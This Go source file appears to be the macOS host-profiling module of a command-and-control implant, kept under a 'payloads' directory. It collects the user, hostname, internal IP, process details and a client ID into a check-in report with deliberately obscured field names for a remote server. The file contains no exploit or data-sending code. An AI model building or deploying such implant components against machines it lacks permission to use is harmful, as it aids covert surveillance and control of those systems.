// server/docker/payloads/Darwin/getSystemInfo.go

//go:build darwin
// +build darwin

package main

import (
	"crypto/rand"
	"encoding/json"
	"fmt"
	"math/big"
	"net"
	"os"
	"os/user"
	"runtime"
	"strings"
	"time"
)

// System info template accessors - uses RunCfg
func siKeyStartupTime() string { return erTpl(idxExecReqSysInfoStartupTime) }
func siStatusActive() string   { return erTpl(idxExecReqSysInfoStatusActive) }


type NI struct {
	PID int    `json:"pid"`
	PN  string `json:"pn"`
	UN  string `json:"un"`
	HN  string `json:"hn"`
	IP  string `json:"ip"`
	AC  string `json:"ac"`
	OS  string `json:"os"`
	TS  time.Time `json:"ts"`
	NID string `json:"cl"`
	SD  string `json:"seed"`
}


type NR struct {
	DT NI                `json:"ag"`
	MD map[string]string `json:"md"`
	ST string            `json:"st"`
	ER string            `json:"error,omitempty"`
}

// getProcessInfo gets the current process ID and name
func getProcessInfo() (int, string, error) {
	pid := os.Getpid()
	procName := os.Args[0]
	procName = strings.TrimSpace(strings.Split(procName, string(os.PathSeparator))[len(strings.Split(procName, string(os.PathSeparator)))-1])
	return pid, procName, nil
}

// getCurrentUser gets the username of the current process
func getCurrentUser() (string, error) {
	currentUser, err := user.Current()
	if err != nil {
		return "", fmt.Errorf("%s", ErrCtx(E19, err.Error()))
	}
	return currentUser.Username, nil
}

// getHostname gets the system hostname
func getHostname() (string, error) {
	hostname, err := os.Hostname()
	if err != nil {
		return "", fmt.Errorf("%s", ErrCtx(E19, err.Error()))
	}
	return hostname, nil
}

// getArchitecture gets the system architecture
func getArchitecture() string {
	return runtime.GOARCH
}

// getOperatingSystem gets the operating system name
func getOperatingSystem() string {
	return runtime.GOOS
}

// isValidIP checks if the IP meets our criteria
func isValidIP(ip string) bool {
	if ip == "localhost" {
		return false
	}

	parsedIP := net.ParseIP(ip)
	if parsedIP == nil {
		return false
	}

	if ipv4 := parsedIP.To4(); ipv4 != nil {
		if strings.HasPrefix(ipv4.String(), "127.") {
			return false
		}
		if strings.HasPrefix(ipv4.String(), "169.") {
			return false
		}
		return true
	}

	return false
}

// getInternalIP gets the first valid internal IP address
func getInternalIP() (string, error) {
	interfaces, err := net.Interfaces()
	if err != nil {
		return "", fmt.Errorf("%s", ErrCtx(E12, err.Error()))
	}

	for _, iface := range interfaces {
		if iface.Flags&net.FlagLoopback != 0 || iface.Flags&net.FlagUp == 0 {
			continue
		}

		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}

		for _, addr := range addrs {
			ipStr := ""
			switch v := addr.(type) {
			case *net.IPNet:
				ipStr = v.IP.String()
			case *net.IPAddr:
				ipStr = v.IP.String()
			}

			if isValidIP(ipStr) {
				return ipStr, nil
			}
		}
	}

	return "", fmt.Errorf("%s", Err(E12))
}

// generateSeed creates a random 24-character alphanumeric string
func generateSeed() (string, error) {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	const length = 24

	result := make([]byte, length)
	charsetLength := big.NewInt(int64(len(charset)))

	for i := 0; i < length; i++ {
		randomIndex, err := rand.Int(rand.Reader, charsetLength)
		if err != nil {
			return "", fmt.Errorf("%s", ErrCtx(E19, err.Error()))
		}
		result[i] = charset[randomIndex.Int64()]
	}

	return string(result), nil
}

// collectSystemInfo gathers all system information
func collectSystemInfo(clientID string) (*NR, error) {
	info := &NI{
		NID:  clientID,
		OS:        getOperatingSystem(),
		TS:        time.Now().UTC(),
	}

	var err error

	// Generate seed
	info.SD, err = generateSeed()
	if err != nil {
		return nil, fmt.Errorf("%s", ErrCtx(E19, err.Error()))
	}

	// Get process information
	info.PID, info.PN, err = getProcessInfo()
	if err != nil {
		return nil, fmt.Errorf("%s", ErrCtx(E19, err.Error()))
	}

	// Get username
	info.UN, err = getCurrentUser()
	if err != nil {
		return nil, fmt.Errorf("%s", ErrCtx(E19, err.Error()))
	}

	// Get hostname
	info.HN, err = getHostname()
	if err != nil {
		return nil, fmt.Errorf("%s", ErrCtx(E19, err.Error()))
	}

	// Get IP address
	info.IP, err = getInternalIP()
	if err != nil {
		return nil, fmt.Errorf("%s", ErrCtx(E12, err.Error()))
	}

	// Get architecture
	info.AC = getArchitecture()

	// Create the full report with metadata including JSON field mapping
	metadata := map[string]string{
		siKeyStartupTime(): time.Now().UTC().Format(time.RFC3339),
	}

	// Add JSON field mapping to metadata so server can decode responses
	// The mapping is serialized as JSON within the metadata
	fieldMapping := GetJSONFieldMapping()
	if fieldMappingJSON, err := json.Marshal(fieldMapping); err == nil {
		metadata["jfm"] = string(fieldMappingJSON)
	}

	report := &NR{
		DT: *info,
		MD: metadata,
		ST: siStatusActive(),
	}

	return report, nil
}

// toJSON converts to a JSON string
func (r *NR) toJSON() (string, error) {
	jsonBytes, err := json.MarshalIndent(r, "", "    ")
	if err != nil {
		return "", fmt.Errorf("%s", ErrCtx(E18, err.Error()))
	}
	return string(jsonBytes), nil
}
